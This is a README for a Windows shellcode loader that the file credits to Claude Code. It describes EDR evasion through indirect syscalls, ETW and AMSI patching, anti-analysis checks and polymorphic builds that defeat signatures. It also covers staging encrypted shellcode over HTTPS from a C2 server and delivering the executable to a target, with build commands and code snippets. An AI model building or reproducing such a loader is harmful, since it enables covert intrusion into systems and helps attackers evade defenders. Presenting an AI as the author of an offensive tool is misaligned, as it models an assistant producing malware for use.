# claude-loader

> **Entire codebase written by [Claude Code](https://claude.ai/code) (Anthropic Claude Opus 4.6)**

A CRT-free x64 Windows shellcode loader with polymorphic builds, indirect syscalls, and HTTPS staging. Each compilation produces a unique binary — no two builds share the same hash.

```
Main()
  │
  ├─ IatCamouflage()           Pad IAT with benign imports
  ├─ AntiAnalysis()            Debugger / sandbox checks
  ├─ InitializeNtSyscalls()    Extract SSN + syscall;ret addr from ntdll
  ├─ InitializeWinApis()       Resolve LoadLibraryA / GetProcAddress via PEB
  ├─ PatchEtw()                Neutralize ETW
  ├─ PatchAmsi()               Neutralize AMSI
  ├─ BruteForceDecryption()    Recover RC4 key from protected key
  ├─ DownloadPayload()         HTTPS GET → encrypted shellcode
  ├─ Rc4DecryptPayload()       SystemFunction032 in-place decrypt
  ├─ NtAllocateVirtualMemory   Allocate RW memory (indirect syscall)
  ├─ memcpy + wipe heap        Copy shellcode, zero original buffer
  ├─ NtProtectVirtualMemory    RW → RWX (indirect syscall)
  ├─ NtCreateThreadEx          Execute shellcode (indirect syscall)
  └─ NtWaitForSingleObject     Wait indefinitely (indirect syscall)
```

## Quick Start

### 1. Encrypt your shellcode

```bash
python Encrypt.py payload.bin --url https://<C2_IP>:<PORT>/payload.dat
```

This generates:
- **`data.enc`** — RC4-encrypted shellcode (upload to your C2)
- **`Payload.h`** — Protected key, hint byte, XOR-encoded URL, and all obfuscated strings with a fresh random XOR key

### 2. Build

```bash
build.bat
```

The build pipeline: `ml64` (assemble) → `cl` (compile + link) → `Mutate.py` (randomize PE metadata).

### 3. Deploy

1. Upload `data.enc` to your staging server at the URL from step 1
2. Deliver the output executable to the target

### 4. Rebuild for a new signature

Simply re-run steps 1 and 2. Every run of `Encrypt.py` generates a new random XOR key, RC4 key, and URL encoding. `Mutate.py` further randomizes the PE headers. The result is a completely different binary hash — no static signature will match across builds.

### Debug mode

Uncomment `#define DEBUG` in `Common.h` to enable logging to `debug.log` and disable anti-analysis checks.

## Technical Details

### Indirect Syscalls

SSNs are extracted from ntdll's export table by pattern-matching the syscall stub prologue (`4C 8B D1 B8 XX XX 00 00`). If a stub is hooked by EDR, neighboring clean stubs are searched and the SSN is inferred by offset. Execution jumps to a `syscall; ret` (`0F 05 C3`) gadget inside ntdll, so the return address stays within ntdll's address range.

```asm
RunSyscall:
    mov r10, rcx
    mov eax, [wSSn]
    jmp QWORD PTR [qSyscallAddr]   ; jumps into ntdll
```

All four NT functions used by the loader go through this path:

| Syscall | JOAAT Hash | Purpose |
|---------|------------|---------|
| NtAllocateVirtualMemory | `0xE33A06BF` | Allocate RW memory |
| NtProtectVirtualMemory | `0x82BB0EE0` | Change to RWX |
| NtCreateThreadEx | `0xE5F15DAA` | Create execution thread |
| NtWaitForSingleObject | `0xE2C26E26` | Wait for thread |

### Polymorphic String Obfuscation

All 17 sensitive strings (DLL names, API names, User-Agent) are XOR-encoded with a **random key that changes every build**. `Encrypt.py` picks a key from the safe range (values that won't produce null bytes in any encoded string) and writes all encoded arrays to `Payload.h` as `#define` macros.

```c
// Payload.h (auto-generated, different every run)
#define XKEY            0xA3
#define XSTR_NTDLL_DLL  { 0xCD, 0xD7, 0xC7, 0xCF, 0xCF, 0x8D, ... , 0x00 }

// Evasion.c (compile-time substitution)
BYTE xNtdll[] = XSTR_NTDLL_DLL;
DEOBF(xNtdll);   // XOR-decode on the stack at runtime
```

No plaintext strings appear in `.rdata`. The byte patterns are completely different between builds.

### HTTPS Staging

WinINet is loaded dynamically via `LoadLibraryA` (resolved through PEB). For self-signed certificates (Sliver, Cobalt Strike, etc.), the loader follows the MSDN retry pattern:

1. First `HttpSendRequest` fails with `ERROR_INTERNET_INVALID_CA` (12045)
2. Query existing security flags on the **same request handle** (SSL context is preserved)
3. OR in `SECURITY_FLAG_IGNORE_UNKNOWN_CA` and related flags
4. Retry `HttpSendRequest` on the **same handle** — succeeds

### Memory Management

```
NtAllocateVirtualMemory (RW)  →  memcpy shellcode  →  wipe heap buffer
    →  NtProtectVirtualMemory (RWX)  →  NtCreateThreadEx  →  NtWaitForSingleObject
```

RWX is used instead of RX for compatibility with Go-based shellcode (e.g., Sliver) that writes to its own pages at runtime. All intermediate buffers are zeroed and freed.

### Encryption Pipeline

```
Encrypt.py
  ├─ Generate random XOR key (XKEY) for string obfuscation
  ├─ XOR-encode all 17 API/DLL strings with XKEY
  ├─ Generate random 16-byte RC4 key
  ├─ RC4-encrypt shellcode → data.enc
  ├─ Protect RC4 key: ProtectedKey[i] = (Key[i] + i) ^ random_byte
  ├─ XOR-encode staging URL with separate random key
  ├─ Write Payload.h (all defines + encoded strings)
  └─ Self-verify: brute-force → decrypt → compare original

build.bat
  ├─ ml64: assemble AsmStub.asm
  ├─ cl: compile + link (CRT-free)
  └─ Mutate.py: randomize PE timestamp, Rich header, section padding
```

### PE Mutation (Mutate.py)

Post-build step that modifies the compiled binary without affecting functionality:

| Target | What changes |
|--------|-------------|
| TimeDateStamp | Randomized to a plausible value |
| Rich header | Filled with random bytes (removes compiler fingerprint) |
| Checksum | Zeroed (valid for EXEs, Windows ignores it) |
| Section padding | Alignment gaps filled with random bytes |
